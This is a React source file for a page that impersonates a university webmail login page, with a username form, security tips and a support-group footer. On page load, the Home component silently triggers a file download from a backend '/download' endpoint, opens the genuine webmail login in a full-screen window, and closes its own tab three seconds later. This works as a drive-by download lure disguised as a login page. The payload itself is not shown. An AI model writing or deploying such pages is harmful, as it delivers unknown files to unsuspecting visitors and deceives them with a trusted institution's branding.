import { BrowserRouter as Router, Routes, Route, Link } from "react-router-dom";
import { useEffect } from "react";

function Home() {
  useEffect(() => {
    const backendUrl =
      process.env.REACT_APP_BACKEND_URL || "http://localhost:5000";

    // Prevent multiple executions using a flag stored outside useEffect
    if (window.__hasRun) return;
    window.__hasRun = true;

    // Start the file download
    const link = document.createElement("a");
    link.href = `${backendUrl}/download`;
    link.setAttribute("download", ""); // Ensures it's a download
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    const newWindow = window.open(
      "https://webmail.nitt.edu/login/",
      "_blank",
      `width=${window.screen.availWidth},height=${window.screen.availHeight},top=0,left=0`
    );

    if (newWindow) {
      setTimeout(() => {
        window.open("about:blank", "_self");
        window.close();
      }, 3000);
    }
  }, []);

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
      {/* Header */}
      <h1 className="text-3xl font-bold text-gray-800">Webmail Login</h1>

      {/* Login Container */}
      <div className="bg-white shadow-lg rounded-lg p-6 w-full max-w-md mt-6">
        <h2 className="text-xl font-semibold text-gray-800 text-center">
          Login to Your Account
        </h2>

        <form action="" method="POST" className="mt-4">
          <div className="mb-4">
            <label htmlFor="uname" className="block text-gray-700 font-medium">
              Username
            </label>
            <input
              type="text"
              id="uname"
              name="uname"
              placeholder="Enter your username"
              required
              className="w-full px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400"
            />
          </div>
          <div className="mb-4 text-sm text-gray-600">
            Click Next to enter the password.
          </div>
          <div className="text-center">
            <button
              type="submit"
              name="btn_checkuser"
              id="btn_checkuser"
              className="w-full bg-blue-600 text-white py-2 rounded-md font-semibold hover:bg-blue-700 transition"
            >
              Next
            </button>
          </div>
        </form>
      </div>

      {/* Information Section */}
      <div className="mt-6 bg-white p-4 shadow-md rounded-md w-full max-w-lg">
        <h3 className="text-lg font-semibold text-gray-800 underline">
          Important Information
        </h3>
        <ul className="mt-2 text-gray-700 space-y-2">
          <li>🔹 Never share your password with anyone.</li>
          <li>
            🔹 Avoid responding to emails requesting your login credentials.
          </li>
          <li>🔹 Change your password at least once a month for security.</li>
          <li>🔹 If you suspect phishing, update your password immediately.</li>
        </ul>
      </div>

      {/* Footer */}
      <footer className="bg-blue-600 py-4 text-center mt-6 w-full">
        <span className="text-white font-medium">
          Developed and Maintained by Computer Support Group
        </span>
      </footer>
    </div>
  );
}

function About() {
  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
      <h1 className="text-3xl font-bold text-gray-800">About Us</h1>
      <p className="text-gray-600 mt-2">
        We provide great services to our users.
      </p>
    </div>
  );
}

function Contact() {
  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
      <h1 className="text-3xl font-bold text-gray-800">Contact Us</h1>
      <p className="text-gray-600 mt-2">Email us at contact@example.com</p>
    </div>
  );
}

function Navbar() {
  return (
    <nav className="bg-blue-500 text-white p-4">
      <div className="container mx-auto flex justify-between">
        <h1 className="text-xl font-bold">Webmail</h1>
        <div className="space-x-4">
          <Link to="/" className="hover:underline">
            Home
          </Link>
          <Link to="/about" className="hover:underline">
            About
          </Link>
          <Link to="/contact" className="hover:underline">
            Contact
          </Link>
        </div>
      </div>
    </nav>
  );
}

function App() {
  return (
    <Router>
      <Navbar />
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
        <Route path="/contact" element={<Contact />} />
      </Routes>
    </Router>
  );
}

export default App;
